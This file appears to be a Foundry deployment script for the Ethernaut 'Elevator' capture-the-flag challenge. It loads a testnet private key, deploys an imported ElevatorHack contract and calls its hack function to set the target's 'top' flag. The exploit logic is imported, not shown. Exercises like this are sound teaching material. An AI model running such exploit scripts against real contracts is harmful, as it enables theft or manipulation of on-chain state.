// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {IElevator} from "src/hack/interfaces/IElevator.sol";
import {ElevatorHack} from "src/hack/ElevatorHack.sol";

// Estimated total gas used for script: 282380
contract ElevatorScript is Script {
    function run() external {
        address elevatorAddress = vm.envAddress("ELEVATOR_ADDRESS");

        // Load Reentrance contract instance using interface
        IElevator elevator = IElevator(elevatorAddress);

        // Get private key from .env file
        //uint attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");
        uint attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_2");

        // Set attacker as the msg.sender for all subsequent transactions.
        vm.startBroadcast(attackerKey);

        console.log("Deploying ElevatorHack contract...");
        ElevatorHack elevatorHack = new ElevatorHack();
        console.log("Elevator Hack deployed.");

        console2.log("Performing hack...");
        elevatorHack.hack(address(elevator));

        console2.log("'top' set to :", elevator.top());
        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
